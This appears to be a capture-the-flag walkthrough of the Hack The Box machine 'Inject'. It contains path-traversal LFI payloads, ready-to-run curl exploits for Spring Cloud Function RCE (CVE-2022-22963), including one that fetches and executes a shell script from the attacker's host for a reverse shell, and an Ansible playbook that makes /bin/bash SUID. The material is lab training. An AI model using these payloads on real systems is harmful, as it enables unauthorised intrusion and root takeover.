  ![image](https://user-images.githubusercontent.com/87700008/224529412-369cf59f-2320-4a8b-981e-a100f210e4c2.png)
https://app.hackthebox.com/machines/533

## Enumeration :

I started with a quick rustscan and found two open ports: 22 and 8080.

```
sudo rustscan -a 10.10.11.204 -- -sC -sV -T4 -vv -oN inject_nmap
```

![image](https://user-images.githubusercontent.com/87700008/224529454-b7d64af4-88a8-403d-a978-21a25aa68fc4.png)

```
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Upon checking the website running on port 8080, I discovered that it provides cloud and file-sharing services:

![image](https://user-images.githubusercontent.com/87700008/224534505-28220236-e135-4893-9981-26d5478f513e.png)

By going to the '/blogs' section, I found three blogs written by two users: "admin" and "Brandon Auger":

![image](https://user-images.githubusercontent.com/87700008/224534657-01d2e78c-10d3-4e3c-987b-888afa023021.png)

Moving further, I checked the HTML source code of the page, but I didn't find anything special. So, I moved on to directory listing and subdomain enumeration.

During subdomain or VHOST enumeration, I didn't find anything:

![image](https://user-images.githubusercontent.com/87700008/224540315-9024f38b-f8a5-4641-8cad-c6d61dccf4da.png)

However, in the directory list, I found some directories :

![image](https://user-images.githubusercontent.com/87700008/224540364-b533d963-7d2f-4667-a516-20b71d806188.png)

I checked 'release_notes,' but on this page, there were only release notifications :

![image](https://user-images.githubusercontent.com/87700008/224542030-b05e0ee7-d985-42e5-aad6-c3ae5723ffb2.png)

I attempted to register on the page, but it was under construction :

![image](https://user-images.githubusercontent.com/87700008/224542194-41843693-c291-404f-8c54-4603d81f1417.png)

Next, I went to the '/uploads' section, and after uploading the PHP reverse shell, I observed that I could only upload image files. So, I uploaded a file with a '.jpg' extension and found that it led me to another page where I could see my uploaded image.

      /show_image?img=php-reverse-shell.php.jpg
      
 ![image](https://user-images.githubusercontent.com/87700008/224542405-281c94f6-e0d0-4a33-91df-510489a706b9.png)

I tested the '/show_image?img=' path with some LFI payloads and started checking with '/etc/passwd.' After trying multiple payloads, I entered the below payload and observed a 200 response.

    &.//&.//&.//&.//&.//etc/group
    
![image](https://user-images.githubusercontent.com/87700008/224542604-ab7a9e08-3a79-4bba-82f9-3e363a24ec51.png)

I confirmed here that this path is vulnerable to LFI, but I still couldn't read the /etc/passwd content, so I tried some more LFI payloads. 
After some time, I had success with this payload :

    ../../../../../../../../../../../../../../../../etc/passwd
    
![image](https://user-images.githubusercontent.com/87700008/224542688-f6d088b2-33e1-49dd-b149-684d6b969433.png)

I found two users in the above list": "I found two users in the above list, 'frank' and 'phil'.

With further enumeration I found below results :

![image](https://user-images.githubusercontent.com/87700008/224726062-e0834f2c-79ee-421c-92f6-1aa985611374.png)

Going further into the below-mentioned directory, I found an XML config file :

    ../../../../../../../../../../../../../../../../var/www/WebApp/pom.xml
    
In this config file, I found a framework running with 'Spring cloud function,' which is vulnerable to RCE, as found in this [blog](https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645) by Snyk
    
![image](https://user-images.githubusercontent.com/87700008/224727399-f526600f-191f-4142-82ef-acba6a648a56.png)


I discovered a vulnerability in the spring framework module, and found an [exploit](https://github.com/darryk10/CVE-2022-22963) on GitHub for the spring framework module.

To test whether I could create a file in the 'tmp' directory, I executed the following curl command:

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/expl0it")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

![image](https://user-images.githubusercontent.com/87700008/224731422-f9dbf038-60a4-476b-b74c-3830b819a528.png)

After running the command, I checked the 'tmp' directory and found that the 'expl0it' folder had been successfully created. With the directory in place, I was able to proceed to the next step of the attack.

### Initial access:

To get the reverse shell I created a bash file to received reverse shell in my machine with below code :

![image](https://user-images.githubusercontent.com/87700008/224747729-b9ba917c-4be2-49e6-b1ce-4af09fcfc977.png)

I started python3 http server & uploaded the bash file from my using using this command :

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.103/hell.sh -o /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
    
And then I executed the uploaded bash script using this command & got the reverse shell : (pwn3d!🙂)

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
    
![image](https://user-images.githubusercontent.com/87700008/224748383-0c601555-c767-47d3-a5e8-6fd011b8d18e.png)

In Frank's home directory I found a directory called '.m2' so I thought to give it a look & in the folder I found a settings.xml file which contains Phil's password :

![image](https://user-images.githubusercontent.com/87700008/224754633-7fbf629c-c60e-4624-b4de-e78adebc97b2.png)

![image](https://user-images.githubusercontent.com/87700008/224754874-d31ef599-37f2-4f96-96d3-7328ab8e31c0.png)

I tried to login via SSH to Phil account with the gathered credential but I SSH was unsuccessfull. 😕
But then I tried to directly switch user 'su phil' & this time I used the same password and I switched successfully. (pwn3d! 🙂)

Now, that I have the Phil access I got the user flag.

![image](https://user-images.githubusercontent.com/87700008/224756415-b5283543-5190-4b6a-a2b2-32ceafecdc22.png)

## Priv Esc :

For Privilege escalation I used 'linpeas' script but didn't got any hint, I tried manual enumeratyion as well but no luck there as well.

Then I uploaded pspy binary to the Inject box & started checking the root process. I found that there is a process running called 'ansible-playbook' with root privileges :

![image](https://user-images.githubusercontent.com/87700008/224776993-8622cded-e74f-4fdf-ad86-c7b1a865c672.png)

I found an exploit here in [GTFO bins](https://gtfobins.github.io/gtfobins/ansible-playbook/) for the 'ansible-playbook'

This tool is found to automate all "*yml" files in the /task directory in which the playbook_1.yml file is discovered. This file is a fragment of an Ansible playbook file, which is a YAML file that contains a series of tasks that must be executed by Ansible on a set of hosts or on a specific host.

When checked the "/opt/automation/tasks" directory I found that apart from "root", "staff" user is also having the access for writing into the task directory.
And Phil is in the Staff user group :

![image](https://user-images.githubusercontent.com/87700008/224779114-b591dbc0-aae4-4700-99c1-399409b77c57.png)

So, We can write into the 'task' directory & 'ansible-playbook' will run the file if the extension is ending with '.yml' hence I created a file inside the task directory named 'pe.yml' with the below code :

```
- hosts:  localhost
  tasks:
    - name: become root
      command: chmod u+s /bin/bash
      become: true
```

And after waiting for almost 1 minute I executed 'bash -p' & got the root access. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/224781075-83c23094-5233-4aa6-992d-ef768a0adb18.png)


